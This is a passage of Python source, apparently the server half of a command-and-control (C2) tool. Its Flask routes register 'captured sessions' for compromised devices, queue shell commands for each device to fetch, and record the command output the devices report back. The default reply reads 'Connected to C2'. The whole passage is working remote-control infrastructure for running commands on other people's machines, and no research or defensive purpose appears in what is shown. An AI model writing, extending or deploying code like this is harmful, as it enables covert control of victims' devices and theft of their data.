                'last_seen': datetime.now(),
                'commands': []
            }
            return jsonify({'status': 'registered', 'session_id': device_id})
            
        @self.flask_app.route('/command/<session_id>', methods=['GET'])
        def get_command(session_id):
            if session_id in self.captured_sessions:
                # Return pending command
                commands = self.captured_sessions[session_id].get('pending_commands', [])
                if commands:
                    return jsonify({'command': commands.pop(0)})
            return jsonify({'command': 'echo "Connected to C2"'})
            
        @self.flask_app.route('/report/<session_id>', methods=['POST'])
        def report_result(session_id):
            data = request.json
            if session_id in self.captured_sessions:
                self.captured_sessions[session_id]['commands'].append({
                    'command': data.get('command'),
                    'output': data.get('output'),
                    'timestamp': datetime.now()
                })
                self.captured_sessions[session_id]['last_seen'] = datetime.now()
            return jsonify({'status': 'received'})
            
